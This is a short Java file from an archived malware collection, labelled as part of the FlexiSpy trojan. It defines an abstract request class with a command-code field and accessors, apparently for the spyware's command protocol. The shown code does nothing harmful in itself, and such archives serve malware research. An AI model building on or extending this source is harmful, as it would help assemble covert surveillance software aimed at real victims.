/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.prot.unstruct.request;

import com.vvt.prot.unstruct.UnstructCmdCode;

/**
 * @author nattapon
 * @version 1.0
 * @updated 17-Aug-2010 6:39:33 PM
 */
public abstract class UnstructRequest {

	private int mCode;
	public abstract UnstructCmdCode getCommandCode();

	public int getCode() {
		return mCode;
	}

	public void setCode(int code) {
		mCode = code;
	}

}